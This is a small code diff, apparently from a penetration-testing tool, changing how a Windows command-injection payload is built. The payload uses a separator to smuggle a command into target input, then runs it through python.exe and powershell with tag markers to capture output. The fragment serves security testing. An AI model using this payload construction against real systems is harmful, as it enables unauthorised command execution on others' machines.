@@ -85,7 +85,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 )
     else:
       payload = (separator + " " +
-                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe write-host " + TAG + TAG +" $(" + cmd + ") "+ TAG + TAG + "')\""
+                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG +" $(" + cmd + ") "+ TAG + TAG + "')\""
                 )
                                                                       
   else:
